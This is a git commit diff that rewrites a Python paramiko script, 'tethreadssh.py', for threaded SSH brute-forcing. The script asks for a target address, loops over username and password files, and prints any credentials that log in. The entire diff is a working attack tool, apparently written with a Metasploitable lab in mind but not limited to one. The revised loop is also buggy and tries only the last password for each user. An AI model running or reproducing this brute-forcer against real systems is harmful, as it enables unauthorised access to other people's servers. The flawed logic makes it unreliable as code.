2d29842a99b3efb55c946f658ca664c28808acbd
LeandroGarza <leandrogarzap@gmail.com>
2024-05-11 00:16:53 -0300

    mejora de codigo tethread

--- PortScanner/tethreadssh.py
+++ PortScanner/tethreadssh.py
@@ -1,128 +1,56 @@
-# import paramiko, sys, os, termcolor
-"""
+import paramiko, sys, os, termcolor
 import threading, time
 
 stop_flag = 0
 
-def ssh_connectUser(usernames):
-
+def ssh_connectu(username):
     global stop_flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     try:
-        ssh.connect(host, port=22, username=usernames)
+        ssh.connect(host, port=22, username=username,)
         stop_flag = 1
-        print(termcolor.colored(('[+] Found Username: ' + usernames), 'green'))
+        print(termcolor.colored(('[+] Found Username: ' + username), 'green'))
 
     except:
-        print(termcolor.colored(('[-] Incorrect Username: ' + usernames), 'red'))
+        print(termcolor.colored(('[-] Incorrect Username: ' + username), 'red'))
     ssh.close()
 
-def ssh_connect(password):
-
+def ssh_connect(username, password):
     global stop_flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     try:
-        ssh.connect(host, port=22, username=usernames, password=password)
+        ssh.connect(host, port=22, username=username, password=password)
         stop_flag = 1
-        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + usernames), 'green'))
+        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
 
     except:
-        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
+        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
     ssh.close()
-
- 
-
-host = input('[+] Target Address: ')
-# username = input('[+] SSH Username: ')
-# input_file = input('[+] Passwords File: ')
-usernames = "usernames.txt"
-input_file = "passwords.txt"
-print('\n')
-
-if os.path.exists(usernames) == False:
-    print('[!!] That File/Path Doesnt Exist')
-    sys.exit(1)
-
-if os.path.exists(input_file) == False:
-    print('[!!] That File/Path Doesnt Exist')
-    sys.exit(1)
-
-#print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames + '* * *')
-
-with open(usernames, 'r') as file:
-    for line in file.readlines():
-        if stop_flag == 1:
-            t.join()
-            exit()
-
-        usernames = line.strip()
-        t = threading.Thread(target=ssh_connect, args=(usernames,))
-        t.start()
-        time.sleep(0.5)
-
-with open(input_file, 'r') as file:
-    for line in file.readlines():
-        if stop_flag == 1:
-            t.join()
-            exit()
-
-        password = line.strip()
-        t = threading.Thread(target=ssh_connect, args=(password,))
-        t.start()
-        time.sleep(0.5)
-"""
-#segundo codigo
-"""
-import paramiko
-
-def ssh_connect(username, password, target_host, port):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        client.connect(hostname=target_host, port=port, username=username, password=password, timeout=50)
-        print(f"[+] Successful Login: {username}:{password}")
-        client.close()
-    except paramiko.AuthenticationException:
-        print(f"[-] Incorrect Login: {username}")
-
-host = input('[+] Target Address: ')
-# username = input('[+] SSH Username: ')
-# input_file = input('[+] Passwords File: ')
-usernames = "msfadmin"
-input_file = "msfadmin"
-port = 22
-
-for user in usernames:
-    for pwd in input_file:
-        ssh_connect(user, pwd, host, port)
-"""
-import paramiko
-
-def ssh_connect(username, password, target_host, port):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        client.connect(hostname=target_host, port=port, username=username, password=password, timeout=50)
-        print(f"[+] Successful Login: {username}:{password}")
-        client.close()
-    except paramiko.AuthenticationException:
-        print(f"[-] Incorrect Login: {username}")
 
 host = input('[+] Target Address: ')
 usernames_file = "usernames.txt"
 passwords_file = "passwords.txt"
-port = 22
+print('\n')
 
-try:
-    with open(usernames_file, 'r') as users:
-        for user in users:
-            with open(passwords_file, 'r') as passwords:
-                for pwd in passwords:
-                    ssh_connect(user.strip(), pwd.strip(), host, port)
-except FileNotFoundError:
-    print("No se pudo encontrar el archivo de nombres de usuario o contraseñas.")
+if os.path.exists(passwords_file) == False:
+    print('[!!] That File/Path Doesnt Exist')
+    sys.exit(1)
+
+print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames_file + '* * *') 
+
+with open(usernames_file, 'r') as file:
+    for username in file.readlines():
+        if stop_flag == 1:
+            t.join()
+            exit()
+        username = username.strip()
+        with open(passwords_file, 'r') as file:
+            for password in file.readlines():
+                password = password.strip()
+            t = threading.Thread(target=ssh_connect, args=(username, password))
+            t.start()
+            time.sleep(0)
+
 
